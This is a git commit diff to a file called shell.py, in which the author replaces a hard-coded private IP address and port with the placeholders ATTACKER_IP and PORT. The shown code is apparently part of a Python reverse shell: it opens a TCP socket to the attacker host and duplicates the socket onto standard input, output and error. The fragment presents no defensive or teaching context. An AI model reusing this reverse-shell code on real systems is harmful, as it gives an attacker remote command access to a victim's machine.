d5aaf6a2e8e42abaeff1644573e6e047d1bd4627
Piyusha Akash <163670408+0DayS3c@users.noreply.github.com>
2024-08-08 19:07:08 +0530

    Update shell.py

--- shell.py
+++ shell.py
@@ -6,7 +6,7 @@ import socket
 count = 10
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("192.168.8.197",443))
+s.connect(("ATTACKER_IP", PORT))
 dup2(s.fileno(),0)
 dup2(s.fileno(),1)
 dup2(s.fileno(),2)
